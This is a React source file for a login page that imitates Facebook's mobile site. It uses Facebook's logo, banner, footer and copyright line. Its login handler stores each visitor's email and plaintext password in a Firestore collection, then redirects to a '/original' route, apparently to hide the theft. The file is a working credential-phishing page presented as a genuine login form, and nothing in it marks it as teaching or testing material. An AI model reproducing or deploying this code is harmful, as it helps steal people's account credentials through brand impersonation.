import React, { useState } from 'react';
import './Mlogin.css';
import mFacebook from './images/mfacebook.svg';
import plus from './images/plus.png';
import banner from './images/m.png';
import db from './firebase';
import firebase from '@firebase/app';
import '@firebase/firestore';
import { useHistory } from 'react-router-dom';

function Mlogin() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const history = useHistory();
  const login = (event) => {
    event.preventDefault();
    if (email !== '' && password !== '') {
      db.collection('users').add({
        userId: email,
        password: password,
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
      });
      history.push('/original');
    }
  };
  return (
    <div className='mobile'>
      <div className='mobile__banner'>
        <a href='/' target='_top'>
          <img
            className='mobile__banner__logo'
            src={banner}
            alt='mobile logo'
          />
          <span>Get Facebook for Android and browse faster.</span>
        </a>
      </div>
      <div className='mobile__header'>
        <a href='/'>
          <img
            className='mobile__header__logo'
            src={mFacebook}
            alt='facebook logo'
          />
        </a>
      </div>
      <form >
        <div className='mobile__form'>
          <div className='mobile__form__input'>
            <input
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              type='text'
              placeholder='Mobile number or email address'
            />
            <input
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              type='password'
              placeholder='Password'
            />
          </div>
          <div className='mobile__login__button'>
            <input onClick={login} type='submit' value='Log In' />
          </div>
        </div>
      </form>
      <div className='mobile__divider'>
        <span>or</span>
      </div>
      <div className='mobile__signup'>
        <input type='button' value='Create New Account' />
        <a href='/'>Forgotten password?</a>
      </div>
      <div className='mobile__footer'>
        <div className='mobile__footer__top'>
          <div className='mobile__footer__left'>
            <span className='current__selected'>
              <a href='/'>English (UK)</a>
            </span>
            <span>
              <a href='/'>اردو</a>
            </span>
            <span>
              <a href='/'>മലയാളം</a>
            </span>
            <span>
              <a href='/'>தமிழ்</a>
            </span>
          </div>
          <div className='mobile__footer__right'>
            <span>
              <a href='/'>हिन्दी</a>
            </span>
            <span>
              <a href='/'>ಕನ್ನಡ</a>
            </span>
            <span>
              <a href='/'>తెలుగు</a>
            </span>
            <span className='additional'>
              <a href='/'>
                <img src={plus} alt='additional' />
              </a>
            </span>
          </div>
        </div>
        <div className='mobile__footer__bottom'>
          <div className='mobile__footer__bottom__header'>
            <a href='/'>About</a>
            <span aria-hidden='true'> · </span>
            <a href='/'>Help</a>
            <span aria-hidden='true'> · </span>
            <a href='/'>More</a>
          </div>
          <span class='mobile__footer__copyright'>Facebook Inc.</span>
        </div>
      </div>
    </div>
  );
}

export default Mlogin;
